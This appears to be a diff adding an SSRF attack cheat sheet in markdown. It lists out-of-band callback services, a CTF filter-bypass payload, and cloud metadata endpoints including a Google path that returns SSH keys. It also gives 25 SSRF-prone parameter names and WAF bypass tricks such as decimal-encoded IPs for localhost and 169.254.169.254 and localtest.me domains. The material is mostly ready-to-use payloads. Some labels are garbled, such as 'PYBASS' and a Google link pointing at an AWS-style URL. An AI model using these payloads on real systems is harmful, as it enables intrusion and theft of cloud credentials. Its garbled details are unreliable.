@@ -1,0 +1,76 @@
+## Tips
+
+You can use the following websites as an alternative to Burp Collaborator for testing SSRF vulnerabilities
+🔹 canarytokens.org🔹 webhook.site
+
+🔹 app.interactsh.com🔹 hookdeck.com
+
+⇒ **SSRF CTF solution**
+
+ We can only control 3 characters in between https & the allowed URL. little-known trick is: [https://0](https://0.0.0.0/) refers to localhost. We combine ":0/" with directory traversal to bypass this filter to get our flag.
+
+`https:0/test.octagon.net/test.php/../../flag`
+
+Cloud providers users Metadata files to store sensitive information of the service user, such as SSH keys. These data is only accessible on the local network of the running instance.
+
+```html
+AWS  ⇒  [http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)
+Ocean ⇒ [http://169.254.169.254/metadata/v1.json](http://169.254.169.254/metadata/v1.json)
+[Google](http://169.254.169.254/latest/meta-data/Google) ⇒  [http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=jsonDigital](http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=jsonDigital)
+```
+
+---
+
+---
+
+## Top 25 SSRF parameters
+
+```html
+?dest={target}
+?redirect={target}
+?uri={target}
+?path={target}
+?continue={target}
+?url={target}
+?window={target}
+?next={target}
+?data={target}
+?reference={target}
+?site={target}
+?html={target}
+?val={target}
+?validate={target}
+?domain={target}
+?callback={target}
+?return={target}
+?page={target}
+?feed={target}
+?host={target}
+?port={target}
+?to={target}
+?out={target}
+?view={target}
+?dir={target}
+```
+
+---
+
+# **WAF PYBASS**
+
+Types Of Methods
+
+⚫ Using IPV6 => http://::1 or ::1
+⚫ Using Domained Local Host
+⚫ Using Long IP Of 127.0.0.1 => [http://2130706433](http://127.0.0.1/) or 2130706433
+⚫ Find Private Domains In Virustotal , etc ..
+⚫ Using Long IP Of [http://169.254.169.254](http://169.254.169.254/) => [http://2852039166](http://169.254.169.254/) Or 2852039166
+⚫ Using Local Host Insted Of The IP => [http://localhost](http://localhost/)
+
+```
+>======> **Local Host Domains** <=====<
+http://localtest.me
+http://newyork.localtest.me
+http://mysite.localtest.me
+http://redirecttest.localtest.me
+http://sub1.sub2.sub3.localtest.me
+```
